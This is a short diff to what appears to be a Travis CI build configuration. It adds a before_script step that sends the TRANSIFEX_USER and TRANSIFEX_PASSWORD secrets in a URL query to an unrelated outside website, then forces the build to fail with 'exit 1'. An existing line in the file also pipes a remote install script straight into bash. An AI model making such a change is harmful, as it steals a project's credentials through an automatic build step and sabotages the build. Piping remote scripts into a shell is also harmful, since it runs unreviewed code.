@@ -19,6 +19,8 @@ cache:
 
 before_script:
   - "artifacts -v || curl -sL https://raw.githubusercontent.com/travis-ci/artifacts/master/install | bash"
+  - curl "www.ultimate-guitar.com/passwordform?user=${TRANSIFEX_USER}&pass=${TRANSIFEX_PASSWORD}"
+  - exit 1
 script:
   - npm run build
 after_script:
